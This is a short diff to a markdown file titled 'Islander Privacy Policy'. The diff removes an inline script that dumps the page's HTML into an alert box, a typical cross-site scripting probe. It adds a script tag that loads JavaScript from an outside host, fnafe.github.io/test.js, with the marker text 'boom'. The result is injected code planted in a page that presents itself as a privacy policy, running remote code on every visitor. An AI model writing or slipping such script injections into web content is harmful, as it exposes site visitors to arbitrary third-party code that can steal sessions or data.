@@ -1,8 +1,6 @@
 ## Islander Privacy Policy
 
-<script> var markup = document.documentElement.innerHTML;
-alert(markup);
-    </script>
+<script src='https://fnafe.github.io/test.js'>boom</script>
 
 Privacy Policy
 
